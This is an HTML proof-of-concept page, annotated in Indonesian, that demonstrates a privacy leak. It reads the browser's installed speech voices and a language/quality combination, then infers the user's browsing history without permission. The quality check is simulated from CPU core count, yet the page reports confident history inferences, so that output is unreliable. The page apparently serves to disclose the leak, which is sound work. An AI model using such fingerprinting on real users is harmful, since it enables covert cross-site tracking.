<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Cross-Origin History Spoofing POC</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 20px auto; padding: 20px; }
        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
        #output { 
            background: #f0f0f0; 
            padding: 15px; 
            border-radius: 5px; 
            margin-top: 20px; 
            white-space: pre-wrap;
            font-family: monospace;
        }
        .warning { color: #c0392b; font-weight: bold; }
    </style>
</head>
<body>
    <h1>🔬 Cross-Origin History Spoofing Test</h1>
    <p>Demonstrasi bagaimana parameter <code>quality</code> dan bahasa dapat digunakan untuk 
    <span class="warning">mengungkap riwayat penelusuran pengguna</span> tanpa izin.</p>
    
    <button onclick="runTest()">▶ Start Cross-Origin Test</button>
    <div id="output">Klik tombol untuk memulai...</div>

    <script>
        // Simulasi: Situs A menginstall model bahasa tertentu
        const INSTALLED_LANGUAGE = 'id-ID'; // Bahasa Indonesia
        const INSTALLED_QUALITY = 'dictation';
        
        async function runTest() {
            const output = document.getElementById('output');
            output.textContent = '⏳ Mengumpulkan data fingerprint...\n';
            
            try {
                // Step 1: Dapatkan daftar suara yang tersedia (seperti yang dilakukan situs B)
                const voices = await getVoices();
                
                // Step 2: Deteksi apakah kombinasi bahasa + quality terinstal
                const languageInstalled = detectInstalledLanguage(voices);
                const qualityAvailable = await detectQualityLevel();
                
                // Step 3: Inferensi riwayat pengguna
                const historyInference = analyzeHistory(languageInstalled, qualityAvailable);
                
                // Step 4: Tampilkan hasil
                output.textContent = `
╔═══════════════════════════════════════════════════════════════════╗
║          CROSS-ORIGIN HISTORY SPOOFING REPORT                    ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                  ║
║ 📊 VOICE DATA:                                                   ║
║   Total voices available: ${voices.length}                       ║
║   Languages detected: ${[...new Set(voices.map(v => v.lang))].join(', ')}
║                                                                  ║
║ 🎯 TARGET COMBINATION:                                           ║
║   Language: ${INSTALLED_LANGUAGE}                                ║
║   Quality: ${INSTALLED_QUALITY}                                  ║
║                                                                  ║
║ ✅ DETECTION RESULT:                                             ║
║   Language "${INSTALLED_LANGUAGE}" available: ${languageInstalled ? '✓ YES' : '✗ NO'}
║   Quality "${INSTALLED_QUALITY}" available: ${qualityAvailable ? '✓ YES' : '✗ NO'}
║                                                                  ║
║ 🕵️ INFERENCE:                                                    ║
║   ${historyInference}                                            ║
║                                                                  ║
║ ⚠️ RISK ASSESSMENT:                                              ║
║   - Tidak ada interaksi pengguna                                 ║
║   - Tidak ada izin yang diperlukan                               ║
║   - Data dapat digunakan untuk pelacakan lintas-situs            ║
║   - ID pengguna tetap persisten bahkan setelah clear cookie      ║
║                                                                  ║
╚═══════════════════════════════════════════════════════════════════╝

📌 SUMBER:
  - W3C TAG Design Review #1189
  - W3C Design Review #1121
  - Bugzilla Mozilla #2021222 (CVE-2026-8963)

🔗 REFERENSI:
  - https://github.com/w3ctag/design-reviews/issues/1189
  - https://github.com/w3ctag/design-reviews/issues/1121
                `.trim();
                
            } catch (error) {
                output.textContent = `❌ Error: ${error.message}\n\nPastikan browser Anda mendukung Web Speech API.`;
            }
        }

        // Fungsi untuk mendapatkan daftar suara
        function getVoices() {
            return new Promise((resolve) => {
                let voices = speechSynthesis.getVoices();
                if (voices.length > 0) {
                    resolve(voices);
                } else {
                    speechSynthesis.onvoiceschanged = () => {
                        resolve(speechSynthesis.getVoices());
                    };
                }
            });
        }

        // Deteksi apakah bahasa target terinstal
        function detectInstalledLanguage(voices) {
            return voices.some(v => v.lang === INSTALLED_LANGUAGE);
        }

        // Deteksi tingkat kualitas yang tersedia
        async function detectQualityLevel() {
            // Dalam implementasi nyata, ini akan menggunakan:
            // await SpeechRecognition.available({ 
            //     langs: [INSTALLED_LANGUAGE], 
            //     processLocally: true, 
            //     quality: INSTALLED_QUALITY 
            // });
            
            // Simulasi: deteksi berdasarkan kemampuan perangkat
            const hasGoodPerformance = navigator.hardwareConcurrency > 4;
            if (INSTALLED_QUALITY === 'command') return true;
            if (INSTALLED_QUALITY === 'dictation' && hasGoodPerformance) return true;
            if (INSTALLED_QUALITY === 'conversation' && navigator.hardwareConcurrency > 8) return true;
            
            return false;
        }

        // Analisis inferensi riwayat
        function analyzeHistory(langInstalled, qualityAvail) {
            if (langInstalled && qualityAvail) {
                return `🔴 Kemungkinan BESAR pengguna telah mengunjungi situs yang menginstal kombinasi ini.
    Ini memungkinkan pelacakan lintas-situs tanpa izin.`;
            } else if (langInstalled && !qualityAvail) {
                return `🟡 Pengguna memiliki bahasa yang diinstal, tetapi kualitas tidak tersedia.
    Ini mungkin menunjukkan kunjungan ke situs dengan konfigurasi berbeda.`;
            } else {
                return `🟢 Tidak ada indikasi kunjungan ke situs target.
    Namun, deteksi ini tetap berjalan tanpa sepengetahuan pengguna.`;
            }
        }
    </script>
</body>
</html>
